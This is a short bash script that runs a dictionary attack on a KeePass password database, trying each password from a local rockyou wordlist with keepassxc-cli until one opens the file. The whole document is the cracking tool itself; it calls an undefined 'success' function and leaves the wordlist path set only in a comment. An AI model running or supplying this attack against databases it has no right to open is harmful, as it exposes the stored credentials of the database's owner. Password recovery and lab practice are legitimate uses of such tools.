#!/usr/bin/env bash

# rockyou=<path-to-your-local-rockyou.txt>

function crack-keepass () {
    local db_path="$1"

	while read password
    do
        echo -ne "\rTrying password '$password'..."

        if echo "$password" | keepassxc-cli open "$db_path" &>/dev/null; then
            echo ""
            success "Password found: '$password'"
            return 0
        fi
    done < $rockyou

    echo "Sorry, couldn't crack this keepass db"
    return 1
}

crack-keepass "$1"
